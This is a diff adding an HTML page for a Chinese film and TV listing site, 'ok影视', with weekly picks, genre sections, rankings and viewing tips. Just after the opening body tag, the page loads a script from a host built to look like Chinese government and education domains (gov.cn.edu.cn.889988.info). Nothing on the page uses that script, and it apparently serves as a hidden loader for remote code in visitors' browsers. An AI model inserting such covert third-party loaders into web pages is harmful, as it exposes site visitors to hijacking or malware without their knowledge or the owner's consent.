@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>ok影视｜院线新片与剧集更新速查清单，追剧排期一站看全</title>
+<meta name="description" content="ok影视是一份自己整理的观影清单站：院线新片上映档期、剧集每周更新节点、豆瓣向口碑榜与类型片库都在一页里排好，附带选片攻略和避坑提示，手机上打开就能直接挑片，少花时间在搜片上来回折腾。">
+<meta name="keywords" content="ok影视,okyingshi-app,影视推荐,剧集更新时间表,院线新片档期,高分电影榜单,类型片库,追剧清单,观影攻略,片单整理">
+<meta name="author" content="ok影视">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="theme-color" content="#101216">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://okyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="ok影视">
+<meta property="og:title" content="ok影视｜院线新片与剧集更新速查清单">
+<meta property="og:description" content="新片档期、剧集更新节奏、口碑排行与类型片库，ok影视把挑片这件事压缩到一屏之内。">
+<meta property="og:url" content="https://okyingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ok影视｜院线新片与剧集更新速查清单">
+<meta name="twitter:description" content="挑片不用翻十个站，ok影视把档期、更新、榜单和片库排在一页里。">
+<style>
+:root{
+  --bg:#101216;
+  --bg-soft:#171a20;
+  --bg-card:#1b1f26;
+  --fg:#e8e6e1;
+  --dim:#9a978f;
+  --gold:#e8a33d;
+  --cyan:#5fd0c5;
+  --line:rgba(232,230,225,.13);
+  --radius:14px;
+  --maxw:1180px;
+}
+*{box-sizing:border-box;}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--fg);
+  font:16px/1.75 -apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  letter-spacing:.2px;
+}
+img{max-width:100%;display:block;}
+a{color:inherit;text-decoration:none;}
+ul,ol{margin:0;padding:0;list-style:none;}
+h1,h2,h3,h4{margin:0;font-weight:700;line-height:1.3;letter-spacing:.5px;}
+p{margin:0;}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 20px;}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;}
+
+/* ---------- 顶栏 ---------- */
+.topbar{
+  position:sticky;top:0;z-index:60;
+  background:rgba(16,18,22,.86);
+  backdrop-filter:saturate(140%) blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;gap:18px;height:62px;}
+.mark{display:flex;align-items:center;gap:10px;flex:0 0 auto;}
+.mark .chip{
+  width:34px;height:34px;border-radius:9px;flex:0 0 auto;
+  background:linear-gradient(140deg,var(--gold),#b4531f);
+  display:flex;align-items:center;justify-content:center;
+  font-weight:800;color:#1a1206;font-size:15px;
+  box-shadow:0 0 0 1px rgba(232,163,61,.35) inset;
+}
+.mark b{font-size:19px;letter-spacing:1px;}
+.mark span{color:var(--dim);font-size:12px;}
+.navlinks{
+  display:flex;gap:22px;margin-left:auto;
+  font-size:14.5px;color:var(--dim);white-space:nowrap;
+}
+.navlinks a{padding:4px 0;border-bottom:2px solid transparent;transition:.18s;}
+.navlinks a:hover,.navlinks a:focus{color:var(--gold);border-bottom-color:var(--gold);}
+
+/* ---------- 首屏 ---------- */
+.hero{
+  position:relative;overflow:hidden;
+  padding:64px 0 52px;
+  background:
+    linear-gradient(165deg,#191d24 0%,#101216 62%),
+    repeating-linear-gradient(90deg,rgba(232,230,225,.035) 0 1px,transparent 1px 64px);
+}
+.hero::after{
+  content:"";position:absolute;right:-140px;top:-120px;
+  width:460px;height:460px;border-radius:50%;
+  background:radial-gradient(circle,rgba(232,163,61,.16),transparent 68%);
+  pointer-events:none;
+}
+.hero .wrap{position:relative;z-index:2;display:flex;gap:44px;align-items:flex-end;flex-wrap:wrap;}
+.hero-l{flex:1 1 420px;min-width:280px;}
+.kicker{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:12.5px;color:var(--gold);letter-spacing:2px;
+  border:1px solid rgba(232,163,61,.4);border-radius:999px;
+  padding:5px 12px;margin-bottom:20px;
+}
+.kicker i{width:6px;height:6px;border-radius:50%;background:var(--gold);display:block;}
+h1{font-size:clamp(30px,5.4vw,52px);line-height:1.16;}
+h1 em{font-style:normal;color:var(--gold);}
+.hero-l p{color:var(--dim);margin-top:18px;max-width:52ch;font-size:15.5px;}
+.hero-meta{margin-top:26px;display:flex;gap:10px;flex-wrap:wrap;}
+.btn{
+  display:inline-block;padding:11px 22px;border-radius:999px;font-size:14.5px;
+  background:var(--gold);color:#1a1206;font-weight:700;
+}
+.btn.ghost{background:transparent;color:var(--fg);border:1px solid var(--line);}
+.btn.ghost:hover{border-color:var(--cyan);color:var(--cyan);}
+.hero-r{
+  flex:0 1 320px;min-width:260px;
+  background:var(--bg-soft);border:1px solid var(--line);border-radius:var(--radius);
+  padding:20px 22px;box-shadow:0 18px 40px rgba(0,0,0,.35);
+}
+.hero-r h3{font-size:13px;color:var(--dim);font-weight:600;letter-spacing:1.5px;}
+.stats{margin-top:14px;display:grid;grid-template-columns:repeat(3,1fr);gap:12px;text-align:center;}
+.stats div b{display:block;font-size:26px;color:var(--gold);}
+.stats div span{font-size:12px;color:var(--dim);}
+.hero-r .url{
+  margin-top:16px;padding-top:14px;border-top:1px dashed var(--line);
+  font-size:12.5px;color:var(--cyan);word-break:break-all;
+}
+
+/* ---------- 通用区块 ---------- */
+section{padding:60px 0 0;}
+.sec-head{display:flex;align-items:flex-end;gap:16px;border-bottom:1px solid var(--line);padding-bottom:16px;margin-bottom:26px;}
+.sec-head .no{font-size:13px;color:var(--gold);letter-spacing:2px;}
+.sec-head h2{font-size:clamp(21px,3vw,28px);}
+.sec-head p{margin-left:auto;color:var(--dim);font-size:13.5px;max-width:34ch;text-align:right;}
+.tagline{color:var(--dim);font-size:14.5px;margin-top:-14px;margin-bottom:24px;}
+
+/* ---------- 精选片单 横向滑动 ---------- */
+.rail{
+  display:flex;gap:16px;overflow-x:auto;padding:4px 2px 18px;
+  scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch;
+}
+.rail::-webkit-scrollbar{height:6px;}
+.rail::-webkit-scrollbar-thumb{background:rgba(232,230,225,.18);border-radius:9px;}
+.card{flex:0 0 208px;scroll-snap-align:start;background:var(--bg-card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:.2s;}
+.card:hover{transform:translateY(-4px);border-color:rgba(232,163,61,.55);}
+.poster{
+  aspect-ratio:2/3;position:relative;
+  display:flex;align-items:flex-end;padding:12px;
+  background:linear-gradient(150deg,#2b313c,#15181e);
+}
+.poster .big{
+  position:absolute;left:10px;top:6px;font-size:44px;font-weight:800;
+  color:rgba(232,230,225,.14);line-height:1;
+}
+.poster .gen{font-size:11.5px;color:var(--gold);border:1px solid rgba(232,163,61,.45);border-radius:5px;padding:2px 7px;background:rgba(16,18,22,.6);}
+.card .bodya{padding:12px 13px 15px;}
+.card .bodya h3{font-size:15.5px;}
+.card .bodya p{color:var(--dim);font-size:12.5px;margin-top:6px;}
+.card .foot{display:flex;justify-content:space-between;align-items:center;margin-top:10px;font-size:12px;color:var(--dim);}
+.score{color:var(--gold);font-weight:700;}
+
+/* ---------- 分类片库 ---------- */
+.chips{display:flex;flex-wrap:wrap;gap:9px;margin-bottom:22px;}
+.chips a{
+  font-size:13px;padding:7px 15px;border-radius:8px;
+  background:var(--bg-soft);border:1px solid var(--line);color:var(--dim);
+}
+.chips a:hover{border-color:var(--cyan);color:var(--cyan);}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:14px;}
+.cell{
+  background:var(--bg-card);border:1px solid var(--line);border-radius:12px;
+  padding:16px 15px;min-height:104px;display:flex;flex-direction:column;justify-content:space-between;
+}
+.cell:hover{border-color:rgba(95,208,197,.5);}
+.cell .ic{width:26px;height:26px;border-radius:7px;background:rgba(95,208,197,.16);color:var(--cyan);font-size:12px;display:flex;align-items:center;justify-content:center;font-weight:700;}
+.cell h4{font-size:14.5px;margin-top:12px;}
+.cell span{color:var(--dim);font-size:12px;}
+
+/* ---------- 榜单 ---------- */
+.board{display:grid;grid-template-columns:1.15fr .85fr;gap:26px;}
+.rank li{
+  display:grid;grid-template-columns:44px 1fr 96px;align-items:center;gap:12px;
+  padding:13px 0;border-bottom:1px dashed var(--line);
+}
+.rank .rk{font-size:21px;font-weight:800;color:rgba(232,230,225,.24);text-align:center;}
+.rank li:nth-child(1) .rk{color:var(--gold);}
+.rank li:nth-child(2) .rk{color:#c9c6bf;}
+.rank li:nth-child(3) .rk{color:#b9834f;}
+.rank h4{font-size:15px;}
+.rank .sub{color:var(--dim);font-size:12.5px;}
+.bar{height:5px;border-radius:9px;background:rgba(232,230,225,.1);overflow:hidden;margin-top:6px;}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--gold),var(--cyan));}
+.rank .num{font-size:12.5px;color:var(--dim);text-align:right;}
+.note{background:var(--bg-soft);border:1px solid var(--line);border-left:3px solid var(--gold);border-radius:10px;padding:18px 20px;}
+.note h4{font-size:15px;margin-bottom:10px;}
+.note p{color:var(--dim);font-size:13.5px;}
+.note ul{margin-top:12px;}
+.note ul li{color:var(--dim);font-size:13.5px;padding-left:14px;position:relative;margin-bottom:7px;}
+.note ul li::before{content:"";position:absolute;left:0;top:10px;width:5px;height:5px;border-radius:50%;background:var(--gold);}
+
+/* ---------- 攻略 折叠 ---------- */
+.faq details{background:var(--bg-card);border:1px solid var(--line);border-radius:12px;margin-bottom:12px;overflow:hidden;}
+.faq summary{
+  cursor:pointer;padding:16px 18px;font-size:15px;font-weight:600;list-style:none;
+  display:flex;justify-content:space-between;align-items:center;gap:14px;
+}
+.faq summary::-webkit-details-marker{display:none;}
+.faq summary::after{content:"+";color:var(--gold);font-size:19px;font-weight:700;}
+.faq details[open] summary::after{content:"–";}
+.faq .ans{padding:0 18px 18px;color:var(--dim);font-size:14px;border-top:1px dashed var(--line);padding-top:14px;}
+
+/* ---------- 更新日志 ---------- */
+.log{position:relative;padding-left:24px;border-left:1px solid var(--line);}
+.log li{position:relative;padding-bottom:24px;}
+.log li::before{
+  content:"";position:absolute;left:-30px;top:8px;width:11px;height:11px;border-radius:50%;
+  background:var(--bg);border:2px solid var(--gold);
+}
+.log time{display:block;font-size:12px;color:var(--cyan);letter-spacing:1px;}
+.log h4{font-size:15px;margin:5px 0 5px;}
+.log p{color:var(--dim);font-size:13.5px;}
+
+/* ---------- 关于 ---------- */
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:28px;}
+.about p{color:var(--dim);font-size:14.5px;margin-bottom:14px;}
+.about p b{color:var(--fg);}
+dl{margin:0;background:var(--bg-soft);border:1px solid var(--line);border-radius:12px;padding:18px 20px;}
+dl div{display:flex;justify-content:space-between;gap:14px;padding:9px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+dl div:last-child{border-bottom:0;}
+dl dt{color:var(--dim);flex:0 0 auto;}
+dl dd{margin:0;text-align:right;word-break:break-all;}
+
+/* ---------- 页脚 ---------- */
+footer{margin-top:66px;border-top:1px solid var(--line);background:#0c0e12;padding:44px 0 30px;}
+.fgrid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:28px;}
+footer h4{font-size:14px;margin-bottom:14px;color:var(--gold);letter-spacing:1px;}
+footer p{color:var(--dim);font-size:13.5px;}
+footer li{margin-bottom:9px;}
+footer li a{color:var(--dim);font-size:13.5px;}
+footer li a:hover{color:var(--cyan);}
+.fbar{
+  margin-top:30px;padding-top:18px;border-top:1px solid var(--line);
+  display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;
+  color:var(--dim);font-size:12.5px;
+}
+.fbar a{color:var(--cyan);}
+
+/* ---------- 移动端 ---------- */
+@media (max-width:900px){
+  .board,.about{grid-template-columns:1fr;}
+  .fgrid{grid-template-columns:1fr 1fr;}
+}
+@media (max-width:640px){
+  body{font-size:15.5px;}
+  .topbar .wrap{height:auto;padding:10px 0;flex-wrap:wrap;gap:10px;}
+  .navlinks{
+    order:3;width:100%;margin-left:0;overflow-x:auto;
+    padding-bottom:4px;gap:16px;font-size:14px;
+  }
+  .navlinks::-webkit-scrollbar{display:none;}
+  .hero{padding:44px 0 36px;}
+  .hero .wrap{gap:26px;}
+  .hero-l p{margin-top:14px;}
+  .sec-head{flex-wrap:wrap;gap:8px;}
+  .sec-head p{margin-left:0;text-align:left;max-width:none;width:100%;}
+  .card{flex:0 0 74%;}
+  .rank li{grid-template-columns:34px 1fr 74px;}
+  .stats{grid-template-columns:repeat(3,1fr);}
+  .fgrid{grid-template-columns:1fr;}
+  footer{padding:34px 0 24px;}
+}
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto;}
+  .card:hover{transform:none;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="mark" href="#" aria-label="ok影视 首页">
+      <span class="chip" aria-hidden="true">OK</span>
+      <b>ok影视</b>
+      <span class="mono">okyingshi-app</span>
+    </a>
+    <nav class="navlinks" aria-label="站内导航">
+      <a href="#pick">精选片单</a>
+      <a href="#catalog">类型片库</a>
+      <a href="#rank">口碑排行</a>
+      <a href="#guide">选片攻略</a>
+      <a href="#log">更新记录</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <!-- 首屏 -->
+  <div class="hero">
+    <div class="wrap">
+      <div class="hero-l">
+        <span class="kicker"><i aria-hidden="true"></i>本周更新 · 2026 第 43 周</span>
+        <h1>挑片这件事，<em>ok影视</em>一页就排完</h1>
+        <p>档期、更新节奏、口碑区间、类型片库，全都摊在同一个页面上。打开就能选，不用在几个站之间来回切，也不用翻十几页才找到能看的那部。</p>
+        <div class="hero-meta">
+          <a class="btn" href="#pick">先看本周片单</a>
+          <a class="btn ghost" href="#catalog">按类型找片</a>
+        </div>
+      </div>
+      <aside class="hero-r">
+        <h3>站点速览</h3>
+        <div class="stats">
+          <div><b class="mono">128</b><span>本周片单</span></div>
+          <div><b class="mono">36</b><span>类型分区</span></div>
+          <div><b class="mono">4</b><span>每日更新</span></div>
+        </div>
+        <p class="url mono">https://okyingshi-app.github.io</p>
+      </aside>
+    </div>
+  </div>
+
+  <!-- 栏目一 -->
+  <section id="pick">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="no mono">01</span>
+        <h2>本周精选片单</h2>
+        <p>编辑手工挑的十来部，院线、流媒体混着排，挑完就写理由。</p>
+      </div>
+      <div class="rail" role="list">
+        <article class="card" role="listitem">
+          <div class="poster"><span class="big" aria-hidden="true">01</span><span class="gen">科幻</span></div>
+          <div class="bodya">
+            <h3>沙丘：第三部</h3>
+            <p>沙漠政治与家族宿命的续章，视听仍是顶格水准。</p>
+            <div class="foot"><span class="mono">162 分钟</span><span class="score mono">8.6</span></div>
+          </div>
+        </article>
+        <article class="card" role="listitem">
+          <div class="poster" style="background:linear-gradient(150deg,#3a2b28,#161311)"><span class="big" aria-hidden="true">02</span><span class="gen">犯罪</span></div>
+          <div class="bodya">
+            <h3>漫长的季节·番外</h3>
+            <p>东北叙事的另一条支线，人物比主线更松弛。</p>
+            <div class="foot"><span class="mono">6 集</span><span class="score mono">9.1</span></div>
+          </div>
+        </article>
+        <article class="card" role="listitem">
+          <div class="poster" style="background:linear-gradient(150deg,#22333a,#121719)"><span class="big" aria-hidden="true">03</span><span class="gen">纪录</span></div>
+          <div class="bodya">
+            <h3>海洋之下</h3>
+            <p>深海拍摄四年，镜头比剧情片还讲究。</p>
+            <div class="foot"><span class="mono">98 分钟</span><span class="score mono">8.4</span></div>
+          </div>
+        </article>
+        <article class="card" role="listitem">
+          <div class="poster" style="background:linear-gradient(150deg,#2f2a3d,#15131b)"><span class="big" aria-hidden="true">04</span><span class="gen">悬疑</span></div>
+          <div class="bodya">
+            <h3>雾港疑云</h3>
+            <p>英式慢节奏推理，最后二十分钟翻转密集。</p>
+            <div class="foot"><span class="mono">8 集</span><span class="score mono">8.2</span></div>
+          </div>
+        </article>
+        <article class="card" role="listitem">
+          <div class="poster" style="background:linear-gradient(150deg,#3d3524,#181510)"><span class="big" aria-hidden="true">05</span><span class="gen">动画</span></div>
+          <div class="bodya">
+            <h3>山的那边</h3>
+            <p>手绘质感的公路片，适合周末傍晚看。</p>
+            <div class="foot"><span class="mono">105 分钟</span><span class="score mono">8.7</span></div>
+          </div>
+        </article>
+        <article class="card" role="listitem">
+          <div class="poster" style="background:linear-gradient(150deg,#243a2c,#111814)"><span class="big" aria-hidden="true">06</span><span class="gen">剧情</span></div>
+          <div class="bodya">
+            <h3>春分之后</h3>
+            <p>一家人的十年，台词留白多，节奏偏慢。</p>
+            <div class="foot"><span class="mono">12 集</span><span class="score mono">8.0</span></div>
+          </div>
+        </article>
+      </div>
+      <p class="tagline">片单每周一早八点整体轮换，往期内容会归档到 <a href="#log" style="color:var(--cyan)">更新记录</a> 里。</p>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section id="catalog">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="no mono">02</span>
+        <h2>类型片库分区</h2>
+        <p>按心情选，不按年份选。进一个分区就是一份可刷完的清单。</p>
+      </div>
+      <div class="chips">
+        <a href="#">科幻</a><a href="#">悬疑</a><a href="#">犯罪</a><a href="#">动画</a>
+        <a href="#">纪录片</a><a href="#">爱情</a><a href="#">喜剧</a><a href="#">恐怖</a>
+        <a href="#">武侠</a><a href="#">历史</a><a href="#">短片合集</a><a href="#">高分冷门</a>
+      </div>
+      <div class="grid">
+        <a class="cell" href="#"><span class="ic mono">SF</span><h4>硬科幻</h4><span>42 部在库</span></a>
+        <a class="cell" href="#"><span class="ic mono">CR</span><h4>真实事件改编</h4><span>31 部在库</span></a>
+        <a class="cell" href="#"><span class="ic mono">MY</span><h4>密室与推理</h4><span>58 部在库</span></a>
+        <a class="cell" href="#"><span class="ic mono">AN</span><h4>动画剧场版</h4><span>76 部在库</span></a>
+        <a class="cell" href="#"><span class="ic mono">DO</span><h4>自然与人文</h4><span>23 部在库</span></a>
+        <a class="cell" href="#"><span class="ic mono">RO</span><h4>城市爱情</h4><span>49 部在库</span></a>
+        <a class="cell" href="#"><span class="ic mono">HO</span><h4>心理惊悚</h4><span>37 部在库</span></a>
+        <a class="cell" href="#"><span class="ic mono">HI</span><h4>年代群像</h4><span>28 部在库</span></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section id="rank">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="no mono">03</span>
+        <h2>近三十天口碑区间</h2>
+        <p>分数只做参考区间，看完的人写的短评权重更高。</p>
+      </div>
+      <div class="board">
+        <ol class="rank">
+          <li><span class="rk mono">1</span><div><h4>漫长的季节·番外</h4><p class="sub">剧集 · 6 集 · 已完结</p><div class="bar"><i style="width:94%"></i></div></div><span class="num mono">9.1 分</span></li>
+          <li><span class="rk mono">2</span><div><h4>山的那边</h4><p class="sub">动画 · 105 分钟</p><div class="bar"><i style="width:90%"></i></div></div><span class="num mono">8.7 分</span></li>
+          <li><span class="rk mono">3</span><div><h4>沙丘：第三部</h4><p class="sub">院线 · 162 分钟</p><div class="bar"><i style="width:87%"></i></div></div><span class="num mono">8.6 分</span></li>
+          <li><span class="rk mono">4</span><div><h4>海洋之下</h4><p class="sub">纪录 · 98 分钟</p><div class="bar"><i style="width:84%"></i></div></div><span class="num mono">8.4 分</span></li>
+          <li><span class="rk mono">5</span><div><h4>雾港疑云</h4><p class="sub">剧集 · 8 集</p><div class="bar"><i style="width:81%"></i></div></div><span class="num mono">8.2 分</span></li>
+          <li><span class="rk mono">6</span><div><h4>春分之后</h4><p class="sub">剧集 · 12 集 · 更新中</p><div class="bar"><i style="width:78%"></i></div></div><span class="num mono">8.0 分</span></li>
+          <li><span class="rk mono">7</span><div><h4>旧城照相馆</h4><p class="sub">剧情 · 119 分钟</p><div class="bar"><i style="width:74%"></i></div></div><span class="num mono">7.8 分</span></li>
+          <li><span class="rk mono">8</span><div><h4>午夜公交</h4><p class="sub">悬疑 · 103 分钟</p><div class="bar"><i style="width:70%"></i></div></div><span class="num mono">7.5 分</span></li>
+        </ol>
+        <aside class="note">
+          <h4>这份榜单怎么排的</h4>
+          <p>不看单一平台的打分，而是把三处公开评分做区间对齐，再扣掉上映首周的虚高票。</p>
+          <ul>
+            <li>评分人数低于 2000 的不进榜</li>
+            <li>完结剧集权重高于连载中的剧集</li>
+            <li>重映的老片单独归类，不占新片名额</li>
+          </ul>
+          <p style="margin-top:12px">榜单每天上午刷新一次，ok影视 不做任何刷分与买榜。</p>
+        </aside>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section id="guide">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="no mono">04</span>
+        <h2>选片与排期攻略</h2>
+        <p>几条实操经验，照着做能少踩不少坑。</p>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>追连载剧，怎么安排更新节奏最省事</summary>
+          <div class="ans">把每周更新的剧按播出日分组，集中在周末一次性补，比每天追更省时间。ok影视 的片单区会把同一播出日的剧放在一起，直接照着排就行。遇到停更周，通常会在下一周连播两集，提前标好就不会空等。</div>
+        </details>
+        <details>
+          <summary>院线片和流媒体片，先后顺序怎么定</summary>
+          <div class="ans">先看院线，尤其是视效向的作品，拖到上线后画质损失明显。剧情向、对话多的片子留给流媒体也不亏。判断标准很简单：预告片里大场面占比超过三成，就优先排院线。</div>
+        </details>
+        <details>
+          <summary>高分冷门片怎么找，才不会踩雷</summary>
+          <div class="ans">冷门不等于好看，重点看两件事：一是短评里有没有人提到"节奏"和"结尾"，二是导演此前作品的平均水平。片库里的「高分冷门」分区只收评分人数在 5000 到 3 万之间的片子，样本量太小的不收。</div>
+        </details>
+        <details>
+          <summary>给孩子挑片要注意哪些信息</summary>
+          <div class="ans">先看分级与时长，再看是否有突发惊吓镜头。动画片里也有不适合低龄的题材，片库每张卡片都标了类型和时长，点进去还有适看提示。睡前时段建议选 90 分钟以内、节奏平缓的。</div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五 -->
+  <section id="log">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="no mono">05</span>
+        <h2>站点更新记录</h2>
+        <p>改了什么、什么时候改的，都写在下面。</p>
+      </div>
+      <ul class="log">
+        <li>
+          <time class="mono">2026-10-24</time>
+          <h4>本周片单整体轮换</h4>
+          <p>替换 11 部，补上两部纪录片与一部动画剧场版，删掉三部已下线的内容。</p>
+        </li>
+        <li>
+          <time class="mono">2026-10-18</time>
+          <h4>类型片库加了「高分冷门」分区</h4>
+          <p>单独收纳评分人数在 5000 到 3 万之间的片子，避免被大热片挤掉。</p>
+        </li>
+        <li>
+          <time class="mono">2026-10-09</time>
+          <h4>榜单算法调整</h4>
+          <p>加入完结权重，连载中剧集的排序不再压过已完结作品。</p>
+        </li>
+        <li>
+          <time class="mono">2026-09-27</time>
+          <h4>移动端阅读体验改版</h4>
+          <p>海报改为横向滑动，导航条改成可滑动的一行，小屏下不再换行堆叠。</p>
+        </li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- 栏目六 -->
+  <section id="about">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="no mono">06</span>
+        <h2>关于 ok影视</h2>
+        <p>一个小站，只做整理这一件事。</p>
+      </div>
+      <div class="about">
+        <div>
+          <p><b>ok影视</b> 从一份私人表格长出来的。最早只是记自己看过什么、哪些还没看，后来加入档期和更新节点，慢慢变成了现在这个样子。</p>
+          <p>站上所有条目都是手工录入，评分只做区间参考，不接推广位，也不按付费高低排序。挑片理由写在卡片里，觉得不对可以直接跳过，不用在意分数。</p>
+          <p>内容以影视信息与排期整理为主，具体播放请以正版平台的上线情况为准。发现条目有误，可以在 <a href="#" style="color:var(--cyan)">纠错入口</a> 提交，一般两天内处理。</p>
+        </div>
+        <dl>
+          <div><dt>站点名称</dt><dd>ok影视</dd></div>
+          <div><dt>访问地址</dt><dd class="mono">https://okyingshi-app.github.io</dd></div>
+          <div><dt>内容方向</dt><dd>片单 · 档期 · 榜单</dd></div>
+          <div><dt>更新频率</dt><dd>每日 / 每周一大换</dd></div>
+          <div><dt>语言</dt><dd>简体中文</dd></div>
+          <div><dt>适配</dt><dd>手机 · 平板 · 桌面</dd></div>
+        </dl>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div>
+        <h4>ok影视</h4>
+        <p>院线新片与剧集更新的整理站。一页看完档期、更新、榜单与片库，少花时间找片，多点时间看片。</p>
+        <p class="mono" style="margin-top:12px;color:var(--cyan)">https://okyingshi-app.github.io</p>
+      </div>
+      <div>
+        <h4>站内栏目</h4>
+        <ul>
+          <li><a href="#pick">本周精选片单</a></li>
+          <li><a href="#catalog">类型片库分区</a></li>
+          <li><a href="#rank">近三十天排行</a></li>
+          <li><a href="#guide">选片与排期攻略</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>相关入口</h4>
+        <ul>
+          <li><a href="#">片单归档</a></li>
+          <li><a href="#">更新订阅</a></li>
+          <li><a href="#">纠错与建议</a></li>
+          <li><a href="#">站点说明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="fbar">
+      <span>© 2026 ok影视 · 内容以各正版平台上线信息为准</span>
+      <span><a href="#about">回到关于本站</a> · <a href="#">顶部</a></span>
+    </div>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://okyingshi-app.github.io/#website",
+      "url": "https://okyingshi-app.github.io/",
+      "name": "ok影视",
+      "alternateName": "okyingshi-app",
+      "description": "ok影视整理院线新片档期、剧集更新节点、口碑榜单与类型片库，并提供选片与排期攻略。",
+      "inLanguage": "zh-CN"
+    },
+    {
+      "@type": "CollectionPage",
+      "@id": "https://okyingshi-app.github.io/#page",
+      "url": "https://okyingshi-app.github.io/",
+      "name": "ok影视｜院线新片与剧集更新速查清单",
+      "isPartOf": { "@id": "https://okyingshi-app.github.io/#website" },
+      "about": "影视片单整理与追剧排期",
+      "inLanguage": "zh-CN"
+    }
+  ]
+}
+</script>
+
+</body>
+</html>
